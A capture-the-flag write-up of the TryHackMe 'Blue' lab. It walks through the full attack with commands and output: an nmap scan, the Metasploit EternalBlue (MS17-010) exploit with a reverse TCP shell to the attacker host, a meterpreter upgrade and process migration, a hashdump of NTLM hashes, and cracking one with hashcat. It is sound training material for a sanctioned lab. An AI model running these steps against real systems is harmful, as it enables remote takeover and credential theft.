---
title: TryHackMe Blue write-up
date: 2023-02-21 23:14:30 +1300
categories: [IT, CyberSec]
tags: [write-up]
---

## 1, setup

create ip variable so we don't need to enter it again
$ export ip=10.10.39.230
$ echo $ip

## 2, recon & enumeration

### TASK 1

use nmap for recon.

$ nmap -sV -sC -p-1000 --script vuln $ip

Starting Nmap 7.60 ( https://nmap.org ) at 2023-01-30 01:15 GMT
Nmap scan report for blue.htm (10.10.8.236)
Host is up (0.00048s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
MAC Address: 02:60:86:D7:41:6D (Logic Replacement TECH.)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.85 seconds

no web service running on 80 or 443.

smb service running and is vulnerable to ms17-010. 

## 3, Exploitation

### TASK 2 Gain Access

Exploit the machine and gain a foothold by using Metasploit.

$ msfconsole

msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

    msf6 > use 0
    or 
    msf6 > use exploit/windows/smb/ms17_010_eternalblue
    [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
    msf6 exploit(windows/smb/ms17_010_eternalblue) > 

    Now we need to select the right payload before setup parameters

    msf6 exploit(windows/smb/ms17_010_eternalblue) >  show payloads

    this will list all the payloads. we will select reverse shell

    55  payload/windows/x64/shell/reverse_tcp normal  No Windows x64 Command Shell, Windows x64 Reverse TCP Stager

    msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload payload/windows/x64/shell/reverse_tcp
    payload => windows/x64/shell/reverse_tcp

    msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

setup parameters

set the target machine ip
    $ set RHOSTS {10.10.xx.xx}

set the attacker machine ip
    $ set LHOST {10.13.x.x} 

All parameters are set, now it's time to run the exploit

msf6 exploit(windows/smb/ms17_010_eternalblue) > run

    [*] Started reverse TCP handler on 10.13.2.185:4444 
    [*] 10.10.39.230:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
    [+] 10.10.39.230:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
    [*] 10.10.39.230:445      - Scanned 1 of 1 hosts (100% complete)
    [+] 10.10.39.230:445 - The target is vulnerable.
    [*] 10.10.39.230:445 - Connecting to target for exploitation.
    [+] 10.10.39.230:445 - Connection established for exploitation.
    [+] 10.10.39.230:445 - Target OS selected valid for OS indicated by SMB reply
    [*] 10.10.39.230:445 - CORE raw buffer dump (42 bytes)
    [*] 10.10.39.230:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
    [*] 10.10.39.230:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
    [*] 10.10.39.230:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
    [+] 10.10.39.230:445 - Target arch selected valid for arch indicated by DCE/RPC reply
    [*] 10.10.39.230:445 - Trying exploit with 12 Groom Allocations.
    [*] 10.10.39.230:445 - Sending all but last fragment of exploit packet
    [*] 10.10.39.230:445 - Starting non-paged pool grooming
    [+] 10.10.39.230:445 - Sending SMBv2 buffers
    [+] 10.10.39.230:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
    [*] 10.10.39.230:445 - Sending final SMBv2 buffers.
    [*] 10.10.39.230:445 - Sending last fragment of exploit packet!
    [*] 10.10.39.230:445 - Receiving response from exploit packet
    [+] 10.10.39.230:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
    [*] 10.10.39.230:445 - Sending egg to corrupted connection.
    [*] 10.10.39.230:445 - Triggering free of corrupted buffer.
    [*] Sending stage (336 bytes) to 10.10.39.230
    [*] Command shell session 1 opened (10.13.2.185:4444 -> 10.10.39.230:49290) at 2023-02-19 06:40:50 -0500
    [+] 10.10.39.230:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    [+] 10.10.39.230:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    [+] 10.10.39.230:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


    Shell Banner:
    Microsoft Windows [Version 6.1.7601]
    -----
            

    C:\Windows\system32>whoami
    whoami
    nt authority\system


we are able to set the initial foothold



### TASK 3 Escalate

Now we need to get from command shell to meterpreter shell

first by Ctrl+Z to background this session

    C:\Windows\system32>^Z
    Background session 1? [y/N]  y
    msf6 exploit(windows/smb/ms17_010_eternalblue) > 

then we will get meterpreter by search for the shell_to_meterpreter model

    msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

    Matching Modules
    ================

    #  Name                                    Disclosure Date  Rank    Check  Description
    -  ----                                    ---------------  ----    -----  -----------
    0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

    msf6 exploit(windows/smb/ms17_010_eternalblue) > use 0
    msf6 post(multi/manage/shell_to_meterpreter) > show options

    Module options (post/multi/manage/shell_to_meterpreter):

    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
    LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
    LPORT    4433             yes       Port for payload to connect to.
    SESSION                   yes       The session to run this module on


    View the full module info with the info, or info -d command.


it needs session ID. We can get it by sessions -l

 
    msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

    Active sessions
    ===============

    Id  Name  Type               Information                                             Connection
    --  ----  ----               -----------                                             ----------
    1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] ---  10.13.2.185:4444 -> 10.10.39.230:49290 (10.10.39.230)
                                --

    msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
    SESSION => 1

    msf6 post(multi/manage/shell_to_meterpreter) > run

    [*] Upgrading session ID: 1
    [*] Starting exploit/multi/handler
    [*] Started reverse TCP handler on 10.13.2.185:4433 
    [*] Post module execution completed
    msf6 post(multi/manage/shell_to_meterpreter) > 
    [*] Sending stage (200774 bytes) to 10.10.39.230
    [*] Meterpreter session 2 opened (10.13.2.185:4433 -> 10.10.39.230:49306) at 2023-02-19 06:55:11 -0500
    [*] Stopping exploit/multi/handler

    msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

    Active sessions
    ===============

    Id  Name  Type                     Information                                         Connection
    --  ----  ----                     -----------                                         ----------
    1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601]  10.13.2.185:4444 -> 10.10.39.230:49290 (10.10.39.23
                                        -----                                              0)
    2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                        10.13.2.185:4433 -> 10.10.39.230:49306 (10.10.39.23
                                                                                            0)

    msf6 post(multi/manage/shell_to_meterpreter) > sessions 2
    [*] Starting interaction with 2...

    meterpreter > 


if the first time you don't get the session 2 for meterpreter shell, then try to run it again

now to confirm the session is logged in as system

    meterpreter > getsystem
    [-] Already running as SYSTEM

Now we need to migrate our shell to another process

run ps command to list all running processes

    meterpreter > ps

    Process List
    ============

    PID   PPID  Name                  Arch  Session  User                          Path
    ---   ----  ----                  ----  -------  ----                          ----
    0     0     [System Process]
    4     0     System                x64   0
    352   544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
    416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
    544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
    592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
    604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
    644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
    692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
    700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
    708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
    724   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
    816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
    884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
    932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
    1000  644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
    1020  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
    1064  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
    1164  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
    1296  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
    1332  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
    1396  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
    1456  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
    1468  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
    1584  1296  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
    1612  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
    1940  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
    2080  816   WmiPrvSE.exe
    2248  2016  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    2336  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
    2364  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
    2556  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
    2560  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM
    2680  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
    3032  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM

    meterpreter > 

pick one of the process that's running by user NT AUTHORITY\SYSTEM at the bottom of the list and run the migrate command against it.

It takes a few tries to success

    meterpreter > migrate 3032
    [*] Migrating from 2248 to 3032...
    [-] core_migrate: Operation failed: Access is denied.
    meterpreter > migrate 2680
    [*] Migrating from 2248 to 2680...
    [-] core_migrate: Operation failed: Access is denied.
    meterpreter > migrate 2560
    [*] Migrating from 2248 to 2560...
    [-] core_migrate: Operation failed: Access is denied.
    meterpreter > migrate 2556
    [*] Migrating from 2248 to 2556...
    [-] core_migrate: Operation failed: Access is denied.
    meterpreter > migrate 1612
    [*] Migrating from 2248 to 1612...
    [*] Migration completed successfully.
    meterpreter > 


### TASK 4 Cracking
We can now dump the stored password hash from meterpreter shell

    meterpreter > hashdump
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
    meterpreter > 


Save these information and we can now start cracking the password hash

copy and paste these hash data into a text file and save in the hard drive

    $ hashcat -m 1000 Jon /usr/share/wordlists/rockyou.txt                                                                                      
    hashcat (v6.2.6) starting                                                                                                                     
                                                                                                                                                
    OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]  
    ============================================================================================================================================  
    * Device #1: pthread-11th Gen Intel(R) Core(TM) i7-1165G7 @ 2.80GHz, 1441/2946 MB (512 MB allocatable), 4MCU                                  
                                                                                                                                                
    Minimum password length supported by kernel: 0                                                                                                
    Maximum password length supported by kernel: 256                                                                                              
                                                                                                                                                
    Hashes: 3 digests; 2 unique digests, 1 unique salts                                                                                           
    Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
    Rules: 1

    Optimizers applied:
    * Zero-Byte
    * Early-Skip
    * Not-Salted
    * Not-Iterated
    * Single-Salt
    * Raw-Hash

    ATTENTION! Pure (unoptimized) backend kernels selected.
    Pure kernels can crack longer passwords, but drastically reduce performance.
    If you want to switch to optimized kernels, append -O to your commandline.
    See the above message to find out about the exact limits.

    Watchdog: Temperature abort trigger set to 90c

    Host memory required for this attack: 0 MB

    Dictionary cache built:
    * Filename..: /usr/share/wordlists/rockyou.txt
    * Passwords.: 14344392
    * Bytes.....: 139921507
    * Keyspace..: 14344385
    * Runtime...: 0 secs

    31d6cfe0d16ae931b73c59d7e0c089c0:                          
    ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22                 
                                                            
    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 1000 (NTLM)
    Hash.Target......: Jon
    Time.Started.....: Sat Feb 18 18:45:17 2023 (6 secs)
    Time.Estimated...: Sat Feb 18 18:45:23 2023 (0 secs)
    Kernel.Feature...: Pure Kernel
    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:  1800.0 kH/s (576460752303.51ms) @ Accel:256 Loops:1 Thr:1 Vec:4
    Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new)
    Progress.........: 10201088/14344385 (71.12%)
    Rejected.........: 0/10201088 (0.00%)
    Restore.Point....: 10200064/14344385 (71.11%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
    Candidate.Engine.: Device Generator 
    Candidates.#1....: alread852 -> alphasarto11
    Hardware.Mon.#1..: Util: 26%

    Started: Sat Feb 18 18:45:15 2023
    Stopped: Sat Feb 18 18:45:24 2023


### TASK 5 Find flags

flag1
C:\

flag2
C:\users\Jon\Documents

flag3
C:\windows\system32\config\

Output text content in windows cmd command shell by using the following command
more
type


